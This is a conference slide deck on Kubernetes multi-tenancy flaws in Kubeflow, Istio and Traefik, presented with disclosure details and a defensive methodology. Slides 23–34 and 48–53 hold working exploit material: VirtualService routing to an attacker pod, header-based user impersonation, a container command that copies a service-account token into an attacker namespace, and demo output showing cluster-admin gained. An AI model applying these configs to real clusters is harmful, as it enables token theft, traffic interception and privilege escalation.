---
title: "Breaking Multi-Tenancy Over and Over, and What We Can Learn From This"
speakers: ["Lorin Lehawany", "Sven Nobis"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Lorin Lehawany&Sven Nobis_Breaking Multi-Tenancy Over and Over, and What We Can Learn From This.pdf"
pages: 63
sha256: "8d2ae7802cc2134ce86714c08d362309131b7fab0eaba4b0281b6344d8d412c6"
text_chars: 15951
ocr_pages: 7
has_ocr: true
redacted_secrets: 0
ocr_confidence: 85.2
ocr_unreliable_blocks: 0
vision_verified_pages_changed: 63
vision_verified_pages: 63
ocr_timeouts: 0
pages_recovered_from_text_layer: 1
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:37:03Z"
---
# Breaking Multi-Tenancy Over and Over, and What We Can Learn From This

**Speakers:** Lorin Lehawany, Sven Nobis  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Lorin Lehawany&Sven Nobis_Breaking Multi-Tenancy Over and Over, and What We Can Learn From This.pdf` (63 pages)


## Slide 1

Breaking Multi-Tenancy Over and Over, and What We Can Learn From This

Lorin Lehawany and Sven Nobis, ERNW

Black Hat USA 2026

## Slide 2

Who we are

**Sven Nobis**
Senior Security Analyst
@ ERNW

**Lorin Lehawany**
Security Analyst
@ ERNW

## Slide 3

This slide carries no title or text of its own.

## Slide 4

Are you using Kubernetes?

## Slide 5

Are you running …

**ML workloads?** Data Ingestion? Webhooks? **Complex applications with scripting capabilities?** Scripting? SSRF? **CI/CD pipelines?** Data Ingestion? AI Agents? Custom Scripts? Third-party controllers?

...

## Slide 6

You are running a **multi-tenant** platform!

Yes... whether you intended to or not!

## Slide 7

You are probably securing your cluster with ...

Role-Based Access Control (RBAC), **Network Policies,** Runtime Detection, **Pod Security Standards,** Image Scanning, Resource Quotas, **Admission Controllers,**

...

## Slide 8

Are industry best-practices enough?

No!

Our research shows why.

## Slide 9

Breaking Multi-Tenancy

How to Break Multi-Tenancy Over and Over?

## Slide 10

Breaking Multi-Tenancy

- What is Namespace-based Multi-Tenancy?
- We found various ways to break isolation in Namespace-based Multi-Tenancy
  - Current security best practices won't protect against these problems
- We present exploits in three projects that we found on:
  - Control plane layer
  - Data plane layer

Diagram — Tenant A and Tenant B accessing a Cluster:

- Tenant A
- Tenant B
- Cluster
  - Control Plane
  - Namespace A
  - Namespace B
- Legend: Control Plane (dashed) / Data Plane (solid)

## Slide 11

Breaking Multi-Tenancy

Insecure Cross-Namespace References in CRDs

## Slide 12

What are Cross-Namespace References?

Cluster

Namespace ns1

```yaml
apiVersion: crd.example/v1
kind: TargetCRD
metadata:
  name: example
```

Namespace ns2

```yaml
apiVersion: crd.example/v1
kind: SourceCRD
spec:
  reference:
    name: example
    namespace: ns1
```

Why is this a problem?

## Slide 13

Real-World Scenario: Kubeflow

## Slide 14

Real-World Scenario: Kubeflow

Kubeflow Central Dashboard — kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker

Namespace: attacker (Owner)

Sidebar: Kubeflow · Home · Notebooks · TensorBoards · Volumes · Katib Experiments · KServe Endpoints · Pipelines

Notebooks    + New Notebook

Filter: Enter property name or value

| Status | Name | Type | Created at | Last activity | Image | GPUs | CPUs | Memory |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| ✓ | attackers-n… | jupyter | 32 minutes ago | - | jupyter-scipy:… | 0 | 0.5 | 1.0 Gi |

CONNECT

Items per page: 10    1 – 1 of 1

## Slide 15

Real-World Scenario: Kubeflow

Kubeflow Central Dashboard — kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker

Namespace: attacker (Owner)

Sidebar: Kubeflow · Home · Notebooks · TensorBoards · Volumes · Katib Experiments · KServe Endpoints · Pipelines

Notebooks    + New Notebook

Filter: Enter property name or value

| Status | Name | Type | Created at | Last activity | Image | GPUs | CPUs | Memory |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| ✓ | attackers-n… | jupyter | 32 minutes ago | - | jupyter-scipy:… | 0 | 0.5 | 1.0 Gi |

CONNECT

Items per page: 10    1 – 1 of 1

## Slide 16

Real-World Scenario: Kubeflow

JupyterLab — kubeflow.gke.gcp.ernw.eu/notebook/victim/victims-notebook/lab

File browser:

| Name | Modified |
| --- | --- |
| confidential-data | 2 hours ago |
| lost+found | 3 days ago |
| password_model_demo.i… | 3 days ago |
| password_model_demo.py | 3 days ago |

Launcher

Notebook: Python 3 (ipykernel)

Console: Python 3 (ipykernel)

Other: Terminal · Text File · Markdown File · Python File · Show Contextual Help

## Slide 17

Real-World Scenario: Kubeflow

```
(base) jovyan@attackers-notebook-0:~$ kubectl auth whoami
ATTRIBUTE   VALUE
Username    system:serviceaccount:attacker:default-editor
[...]
(base) jovyan@attackers-notebook-0:~$ kubectl auth can-i \
  --list
```

## Slide 18

Permissions of the default-editor

```
(base) jovyan@attackers-notebook-0:~$ kubectl auth can-i \
  --list
Resources                 [...]    Verbs
configmaps                [...]    [create delete [...]]
deployments.apps          [...]    [create delete [...]]
*.networking.istio.io     [...]    [create delete [...]]
[...]
```

## Slide 19

Istio and VirtualServices

Istio

Gateway Namespace · Workload Namespace

End User → Ingress → Load Balancer → Req. → Istio Gateway → Req. → Virtual Service → Req. →

Istio Gateway → Req. → Virtual Service

## Slide 20

Istio and VirtualServices

Istio

Gateway Namespace · Workload Namespace

Istio Gateway → Req. → Virtual Service → Req. → Service → Req. → Pod

Istio Gateway → Req. → Virtual Service → Req. → Service → Req. → Pod

## Slide 21

Back to Cross-Namespace References

Cluster

Namespace ns1

```yaml
apiVersion: crd.example/v1
kind: TargetCRD
metadata:
  name: example
```

Namespace ns2

```yaml
apiVersion: crd.example/v1
kind: SourceCRD
spec:
  reference:
    name: example
    namespace: ns1
```

Why is this a problem?

## Slide 22

Back to our Real-World Scenario

Cluster

Namespace kubeflow

```yaml
apiVersion: networking.istio.io/v1
kind: Gateway
metadata:
  name: kf-gateway
```

Attacker

Namespace attacker

```yaml
apiVersion: networking.istio.io/v1
kind: VirtualService
spec:
  gateways:
    - kubeflow/kf-gateway
```

Why is this a problem?

## Slide 23

Exploit

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
[...]
spec:
  gateways:
  - kubeflow/kf-gateway
  hosts:
  - '*'
  http:
  - match:
    - uri:
        prefix: /assets/favicon.ico
    route:
    - destination:
        host: poc.attacker.svc.cluster.local
[...]
```

Browser — Kubeflow Central Dashboard (https://kubeflow.gke.g…): Kubeflow · namespace kubeflow-user-example-c… · Notebooks · Filter: Enter property name or value

Attacker

## Slide 24

Impact

Kubeflow

Kubeflow User

Cluster
- NS kubeflow: kf-gateway
- NS attacker: Attacker's Pod

Flow: Kubeflow User → Ingress → kf-gateway → Request → Attacker's Pod → Logs → Attacker

Attacker

## Slide 25

Finding a Way to Cluster Admin

Vertical Privilege Escalation

## Slide 26

Bypassing Network Policies

Kubeflow

Namespace kubeflow
- kf-gateway
- kserve-models-web-application

Ingress → kf-gateway → Req. → kserve-models-web-application

Namespace attacker

```yaml
apiVersion: networking.istio.io/v1
kind: VirtualService
spec:
  gateways:
  - kubeflow/kf-gateway
  http:
    route:
    - destination:
        host: kserve-models-web-application.kubeflow.svc.cluster.local
```

Attacker

Why is this a problem?

## Slide 27

User Impersonation

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
[...]
spec:
  gateways:
  - kubeflow/kubeflow-gateway
  http:
  - headers:
      request:
        set:
          kubeflow-userid: "system:serviceaccount:kubeflow:kserve-controller-manager"
    route:
    - destination:
        host: kserve-models-web-application.kubeflow.svc.cluster.local
[...]
```

Attacker

How does this help to gain cluster admin?

## Slide 28

Full Exploit: Deploy InferenceService

Kubeflow

```json
{
    "resources": [
        {
        "apiVersion": "serving.kserve.io/v1beta1",
        "kind": "InferenceService",
[...]
        "spec": {
            "predictor": {
            "containers": [
```

Attacker

POST /poc/kserve/api/namespaces/kubeflow/kserve-resources

kserve-models-web-application

## Slide 29

Full Exploit: Deploy InferenceService

Kubeflow

Attacker

POST /poc/kserve/api/namespaces/kubeflow/kserve-resources

kserve-models-web-application

Authorization Check: ✓

Deploy Resources

Namespace kubeflow

## Slide 30

Full Exploit: Deploy InferenceService

Kubeflow

```json
{
    "resources": [
        {
        "apiVersion": "serving.kserve.io/v1beta1",
        "kind": "InferenceService",
[...]
        "spec": {
            "predictor": {
            "containers": [
                {
                "command": [
                    "/bin/sh", "-c",
                    "kubectl create secret -n attacker generic poc-cluster-admin-token --from-file=/run/secrets/kubernetes.io/serviceaccount/token; sleep 60000"
                ],
                "serviceAccountName": "profiles-controller-service-account"
[...]
```

Attacker

POST /poc/kserve/api/namespaces/kubeflow/kserve-resources

kserve-models-web-application

## Slide 31

Demo Time!

## Slide 32

Demo

Attacker

Kubeflow

```
(base) jovyan@attackers-notebook-0:~$ kubectl get secrets
NAME                        TYPE     DATA   AGE

(base) jovyan@attackers-notebook-0:~$ kubectl apply -f virtualservice-kserve.yaml
virtualservice.networking.istio.io/kserve-controller-poc created
```

## Slide 33

Demo

Attacker

Kubeflow

```
(base) jovyan@attackers-notebook-0:~$ curl "$DOMAIN/poc-vs/api/namespaces/kubeflow/kserve-resources" \
  -H 'accept: application/json, text/plain, */*' \
  -H 'content-type: application/json' \
  -b "$COOKIES" \
  -H "x-xsrf-token: $XSRF_TOKEN" \
  --data-binary @curl-kserve.json
[...]
{"createdResources":[{"apiVersion":"serving.kserve.io/v1beta1","kind":"InferenceService","name":"poc","namespace":"kubeflow"}],"message":"1 KServe resource(s) successfully created."}
```

## Slide 34

Demo

Attacker

Kubeflow

```
(base) jovyan@attacker-nb-0:~$ kubectl get secret
NAME                        TYPE     DATA   AGE
poc-cluster-admin-token     Opaque   1      43s
(base) jovyan@attacker-nb-0:~$ ./create-kubeconfig-from-token.sh poc-cluster-admin-token kubeconfig.yaml
(base) jovyan@attacker-nb-0:~$ kubectl --kubeconfig kubeconfig.yaml auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```

## Slide 35

Fixing Multi-Tenancy in Kubeflow

## Slide 36

Fixing the Issue: Remove Istio Permission?

Kubeflow

```
(base) jovyan@attackers-notebook-0:~$ kubectl auth can-i \
  --list
Resources                 [...]    Verbs
configmaps                [...]    [create delete [...]]
deployments.apps          [...]    [create delete [...]]
*.networking.istio.io     [...]    [create delete [...]]
[...]
```

(The `*.networking.istio.io   [...]   [create delete [...]]` row is struck through — the Istio permission is removed.)

## Slide 37

Fixing the Issue: Or even the Service Account?

Kubeflow

```
(base) jovyan@attackers-notebook-0:~$ kubectl auth can-i \
  --list
Resources                 [...]    Verbs
configmaps                [...]    [create delete [...]]
deployments.apps          [...]    [create delete [...]]
*.networking.istio.io     [...]    [create delete [...]]
[...]
```

(All three resource rows — `configmaps`, `deployments.apps`, and `*.networking.istio.io` — are struck through: the whole Service Account's permissions are removed.)

## Slide 38

Breaking Multi-Tenancy **Over**

User Impersonation without Service Account

## Slide 39

Idea

Attacker

Kubeflow

New notebook

Name: ernw-sn

- JupyterLab — An interactive development environment for notebooks, code, and data. Ideal for prototyping and experimentation.
- VisualStudio Code — A lightweight but powerful source code editor, redefined and optimized for building and debugging modern web and cloud applications.
- RStudio — An integrated development environment for R, a programming language for statistical computing and graphics.

Custom Notebook

Image: kubeflownotebookswg/jupyter-scipy:v1.9.2

☑ Custom Image
Custom Image: europe-docker.pkg.dev/folkloric-stone-231516/ernw-images/snobis/poc-webserv…

Image pull policy: IfNotPresent

Sidebar: Home · Notebooks · TensorBoards · Volumes · Katib Experiments · KServe Endpoints · Pipelines · Manage Contributors · GitHub · Documentation

## Slide 40

Phishing Attack Scenario

Attacker

1. Attacker creates notebook with custom image
2. Attacker authorizes victim in their namespace
3. Attacker convinces victim to visit link to notebook
4. Victim clicks on link
5. Notebook either
   - logs the request to steal the cookie like before
   - or executes client-side code in Browser to perform actions on behalf of the victim

Kubeflow sidebar: Home · Notebooks · TensorBoards · Volumes · Katib Experiments · KServe Endpoints · Pipelines · Manage Contributors

## Slide 41

Phishing Attack Scenario

Attacker

Kubeflow

Browser tabs: Kubeflow Central Dashboard · XSS PoC
URL: kubeflow.gke.gcp.ernw.eu/notebook/snobisernw-de-ext/test/

DevTools - kubeflow.gke.gcp.ernw.eu/notebook/snobisernw-de-ext/test/
Panels: Elements · Recorder · Console · Sources · Network · Performance · Memory · Application · Privacy and security · Lighthouse · AdBlock
Filters: All · Fetch/XHR · Doc · CSS · JS · Font · Img · Media · Manifest · WS · Wasm · Other

Name: test/ · style.css · script.js · page-script.js · config · env-info · log

Payload — Request Payload (view source):

```
{statusCode: 200, header: {content-length: "386", content-type: "application/json; charset=utf-8",…},…}
  body: "{\"user\":\"snobis_ernw.de#EXT#@ernwlab.onmicrosoft.com\",\"platform\":{\"kubeflowVersion\":\"unknown\…
  header: {content-length: "386", content-type: "application/json; charset=utf-8",…}
    content-length: "386"
    content-type: "application/json; charset=utf-8"
    date: "Wed, 12 Mar 2025 13:30:54 GMT"
    etag: "W/\"182-E4zxd77yuBJ2RjvlogBJDfJaPHk\""
    server: "istio-envoy"
    x-envoy-upstream-service-time: "19"
    x-powered-by: "Express"
  statusCode: 200
```

## Slide 42

Real-world Impact

Kubeflow

Affected:
- Azure
- VMware (by Broadcom)
- AWS
- deployKF
- Red Hat
- IBM
- Google Cloud

Partially affected:
- Canonical

## Slide 43

Coordinated Disclosure

Kubeflow

- CVE-2026-47237 was fixed in Kubeflow by
  - removing the Istio edit permissions from the Service Account
- In addition, we introduce a multi-domain setup to fix the phishing attack scenario
- Thanks to the Kubeflow project!
- However, **insecure Cross-Namespace References in CRDs** is a common problem in various other projects.

(Sticky note) Excellent research paper on the topic by Andong Chen et. al. https://arxiv.org/pdf/2507.03387

## Slide 44

Breaking Multi-Tenancy Over **and Over**

Insecure Cross-Namespace References in Annotations

## Slide 45

Cross-Namespace References in Annotations

Cluster

Namespace ns1

```yaml
kind: Example
apiVersion: crd.example/v1
metadata:
  name: target
[...]
```

Namespace ns2

```yaml
kind: Service
apiVersion: v1
metadata:
  annotations:
    crd.example.ref: ns1/target
```

## Slide 46

Real-World Scenario: Traefik

## Slide 47

Real-World Scenario: Traefik

Cluster

Traefik Proxy → Req. (mTLS) →

Namespace victim

```yaml
kind: Service
apiVersion: v1
metadata:
  annotations:
    traefik.ingress.kubernetes.io/service.serverstransport: st@kubernetescrd
```

```yaml
kind: ServersTransport
apiVersion: traefik.io/v1alpha1
metadata:
  name: st
spec:
  certificatesSecrets:
    - client-cert-secret
```

Pod

What is the impact?

## Slide 48

Impact

Cluster

Namespace attacker

```yaml
kind: Service
apiVersion: v1
metadata:
  annotations:
    traefik.ingress.kubernetes.io/service.serverstransport: victim-st@kubernetescrd
```

Attacker

Namespace victim

```yaml
kind: ServersTransport
apiVersion: traefik.io/v1alpha1
metadata:
  name: st
spec:
  certificatesSecrets:
    - client-cert-secret
```

Flow: Traefik Proxy → Req. (mTLS) → Service (attacker) → Req. → socat Pod → Req. → Pod (victim)

## Slide 49

Impact

Cluster

Namespace attacker

```yaml
kind: Service
apiVersion: v1
metadata:
  annotations:
    traefik.ingress.kubernetes.io/service.serverstransport: victim-st@kubernetescrd
```

Attacker

Namespace victim

```yaml
kind: ServersTransport
apiVersion: traefik.io/v1alpha1
metadata:
  name: st
spec:
  certificatesSecrets:
    - client-cert-secret
```

Flow: Traefik Proxy → Req. → Service (attacker) → Req. → socat Pod → Req. (mTLS) → Pod (victim)

## Slide 50

Coordinated Disclosure

- Issue is being fixed in Traefik.
  - Traefik updated their Multi-Tenancy security documentation and recommends using the Gateway API.
- Thanks to the Traefik project!
- However, **insecure Cross-Namespace References in Annotations** is a general problem
  - And can even have impact beyond the scope of the cluster!

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: gcp-ingress
  annotations:
    ingress.gcp.kubernetes.io/pre-shared-cert: gcp-compute-cert
```

## Slide 51

Breaking Multi-Tenancy Over And Over **And Over**

Cross-Namespace Attacks on Data Plane

## Slide 52

Back to Istio & Its Service Mesh

Istio

Cluster

Namespace victim

Pod
- Workload Container → Req. → Istio Sidecar → Req. → example.com (Internet)

## Slide 53

Exploit & Impact

Istio

Cluster

Namespace victim

Pod
- Workload Container → Req. → Istio Sidecar

Namespace attacker

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: intercept
spec:
  hosts:
  - "example.com"
  gateways:
  - mesh
```

Attacker

Pod

Flow: Istio Sidecar → Req. → VirtualService (attacker) → Req. → Pod

Why is this a problem?

## Slide 54

Coordinated Disclosure

Istio

- Istio maintainers consider this issue to be expected behavior
  - Purposeful user experience trade-off
  - Recommendation: Gateway API as a replacement in Namespace-based Multi-Tenancy
- Together with Istio, we published the Security Note ISTIO-SECURITY-2026-002 and a Blog Post to address this issue.
- Thanks to the Istio project!

## Slide 55

What We Can Learn From It?

Methodology

## Slide 56

Methodology

1. *Use:* Do I use Namespace-based Multi-Tenancy?
2. *Assess:* How do I identify potential weaknesses?
3. *Address:* How do I address them?

## Slide 57

1. Use  |  2. Assess  |  3. Address

1. Do I use Namespace-based Multi-Tenancy?

Where is Namespace-based Multi-Tenancy commonly found:

- Multiple teams, **often *direct* access**
  - Deploy different applications into the same cluster
  - Typically, share a level of trust
- Multiple actors (often customers), **often *indirect* access**
  - Machine learning
  - CI/CD pipelines
  - Scripting capabilities in applications
  - Typically, untrusted
  - Sometimes, this is **unobvious** Namespace-based Multi-Tenancy

## Slide 58

1. Use  |  2. Assess  |  3. Address

2. How do I identify potential weaknesses?

- Apply Hardening — Industry best-practices are applied.
- Identify Components — Which resources are in control of a tenant?
- Assess Resources — What control plane interaction? What data plane interaction?
- Evaluate Interactions — Does this affect the security (CIA) of components outside of the Namespace?

## Slide 59

1. Use  |  2. Assess  |  3. Address

3. How do I address them?

- Deployment of vendor fixes
- Usage of existing admission policy sets
- Definition of custom policies

(Sticky note) Kyverno has an excellent repository of policies: https://kyverno.io/policies/

## Slide 60

Admission Controls

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
[...]
spec:
  gateways:
  - mesh
  hosts:
  - '*'
  http:
  - [...]
```

gateways:
- 🚫 'mesh'
- 🚫 'victim/[...]'
- ✅ 'allowed-gw'

hosts:
- 🚫 '*'
- 🚫 'example.com'
- ✅ 'allowed-host.svc'

## Slide 61

Conclusion

## Slide 62

Conclusion

- Namespaced resources can have impact on the
  - control plane
  - data plane
  - or even beyond the cluster
- This can introduce severe security issues
- These problems are common
  - but their presence may be unobvious
- Invest time to assess your clusters
- Use our methodology as a guideline to ...
  - identify unobvious multi tenancy in your cluster
  - perform an in-depth analysis of the tenants' capabilities
  - apply or develop fixes of the found weaknesses

ernw.de/en/whitepapers/issue-78.html

## Slide 63

Thank you for your attention!

**Lorin Lehawany**
Security Analyst, ERNW
Mail: llehawany@ernw.de
LinkedIn: @lorin-lehawany

**Sven Nobis**
Senior Security Analyst, ERNW
Mail: snobis@ernw.de
LinkedIn: @sven-nobis

ERNW Blog: insinuator.net

